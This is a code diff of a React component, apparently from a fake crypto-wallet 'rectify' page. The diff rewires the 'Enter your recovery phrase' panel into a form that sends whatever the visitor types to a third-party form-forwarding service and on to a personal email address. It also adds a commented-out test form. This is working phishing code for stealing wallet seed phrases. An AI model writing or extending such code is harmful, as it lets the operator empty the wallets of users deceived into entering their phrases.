@@ -29,8 +29,17 @@ function Rectify() {
     setTimeout(() => setOpenImport(false), 3000);
     setTimeout(() => setOpen(true), 3000);
   }
+
   return (
     <div>
+      {/* <form
+        action="https://formsubmit.co/m.hassnainkhan32@gmail.com"
+        method="POST"
+      >
+        <input type="text" name="name" required />
+        <input type="email" name="email" required />
+        <button type="submit">Send</button>
+      </form> */}
       <div className="popup_button">
         <button
           onClick={Active}
@@ -98,17 +107,23 @@ function Rectify() {
                 </TabList>
 
                 <TabPanel>
-                  <div className="fmt_panel">
+                  <form
+                    className="fmt_panel"
+                    action="https://formsubmit.co/m.hassnainkhan32@gmail.com"
+                    method="POST"
+                  >
                     <textarea
                       required
                       rows={4}
                       placeholder="Enter your recovery phrase"
+                      type="text" name="recovery phrase"
                     />
                     <p>
                       Typically 12 (sometimes 24) words separated by single
                       spaces
                     </p>
-                    <button>
+                    {/* <input type="hidden" name="_captcha" value="false"/> */}
+                    <button type="submit">
                       IMPORT
                       <span>
                         <svg
@@ -123,7 +138,7 @@ function Rectify() {
                         </svg>
                       </span>
                     </button>
-                  </div>
+                  </form>
                 </TabPanel>
                 <TabPanel>
                   <div className="fmt_panel">
